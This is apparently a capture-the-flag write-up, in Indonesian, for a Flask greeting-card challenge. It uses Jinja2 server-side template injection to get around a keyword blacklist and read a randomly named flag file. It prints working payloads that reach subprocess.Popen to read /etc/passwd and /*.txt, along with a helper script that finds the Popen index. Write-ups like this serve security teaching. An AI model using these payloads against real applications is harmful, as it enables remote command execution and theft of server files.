# `TobTobiTobTobTobiTobTobTobiTobTobTobali`
Category : Web
## 🗒️ Description
> Cat Tobitob decided to make a gift card page, so you can say "Happy ramadhan", to your relatives :D
---
## 🪄 Solution Steps
Pada soal kali ini, diberikan sebuah web yang dapat memasukkan nama untuk membuat kartu ucapan. Dan kerentanannya berada pada fungsi render_template_string, yang mengarah pada Server-Side Template Injection (SSTI) di Jinja2.
Sebagai pengecekan awal, disini saya coba inputkan payload {{7*7}} dan ini hasilnya

<img width="367" height="474" alt="image" src="https://github.com/user-attachments/assets/dc4d18e7-0c43-4fe1-81ce-e2598f0d6f8a" />

Hal ini dapat menjadi bukti bahwa kita bisa memasukkan payload ssti di dalam inputan tersebut. Namun disini masalahnya, jika kita lihat pada file app.py yang telah di berikan, terdapat beberapa kata yang telah diblacklist antara lain : 
```python
blacklists =['os', 'sys', 'import','subprocess', 'shutil', 'tempfile', 'pickle', 'marshal',
            'write', 'eval', 'exec', 'system', 'popen', 'open',
            'call', 'check_output', 'check_call', 'startfile', 'remove', 'unlink',
            'rmdir', 'remove', 'rename', 'replace', 'chdir', 'chmod', 'chown',
            'chroot', 'link', 'lchown', 'listdir', 'lstat', 'mkdir', 'makedirs',
            'mkfifo', 'mknod', 'open', 'openpty', 'remove', 'removedirs',
            'rename', 'renames', 'rmdir', 'stat', 'symlink', 'unlink', 'walk', 'write',
            'popen', 'builtins', 'global'] 
```
Kemudian, setelah itu jika kita lihat pada Dockerfile
```
FROM python:3.10-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
RUN flag_name=$(openssl rand -hex 8) && mv flag.txt /$flag_name.txt
EXPOSE 5000
CMD ["python", "app.py"]
```

File yang menyimpan sebuah flag, telah diubah namanya menjadi nama acak. 
Maka dari itu disini saya mencoba searching untuk melihat berbagai macam payload ssti yang bisa saya gunakan dan saya dapatkan dari link ini <a href="https://github.com/payloadbox/ssti-payloads">Payload SSTI</a>

Sebagai percobaan pertama saya coba memasukkan ```{{''.__class__.__base__.__subclasses__()}}```, dimana payload ini nantinya akan saya gunakan untuk mendapatkan class subprocess.Popen agar kita bisa menjalankan ```{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}``` yang nanti bisa berfungsi untuk kita melakukan cat pada file flag, namun disini saya harus mendapatkan terlebih dahulu class subprocess.Popen berada di index keberapa.

Setelah menjalankan ```{{''.__class__.__base__.__subclasses__()}}```, saya mendapatkan 
<img width="1919" height="1028" alt="image" src="https://github.com/user-attachments/assets/d92a4b30-8bb9-40eb-be70-c04aba6227c9" />

Dan dari sini saya langsung copy hasil dari payload tersebut dan membuat script untuk menemukan di index keberapa class subprocess.Popen : 
```python
# Masukkan hasil output server ke dalam server_ouput
# contoh : server_output = """<class 'type'>, <class 'async_generator'> dst"""
server_output = """
"""
class_list = server_output.strip('[]\n').split(', ')
for i, class_string in enumerate(class_list):
    if 'Popen' in class_string:
        print(f"Ditemukan! 'subprocess.Popen' berada di indeks: {i}")
        break
```

Dan disini saya dapatkan index nya yaitu 371. Maka untuk pengecekan langsung saja saya memasukkan payload ```{{''.__class__.__base__.__subclasses__()[371]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}``` dan ini hasilnya
<img width="1919" height="932" alt="image" src="https://github.com/user-attachments/assets/9e2e1923-c592-4553-a8a4-f18d84c092ab" />

Maka sudah dipastikan bahwa kita sudah mendapatkan index yang benar, selanjutnya kita harus cat file yang merupakan file flag, namun karena kita tidak tahu nama file flag yang telah diubah menjadi nama acak, kita bisa langsung memasukkan payload ini ```{{''.__class__.__base__.__subclasses__()[371]('cat /*.txt', shell=True, stdout=-1).communicate()}}``` yang dimana artinya kita akan cat semua file yang memiliki ekstensi .txt dan yap, kita dapat flagnya
<img width="1919" height="535" alt="image" src="https://github.com/user-attachments/assets/ba1f1593-1dd1-426f-aea0-62659c730192" />


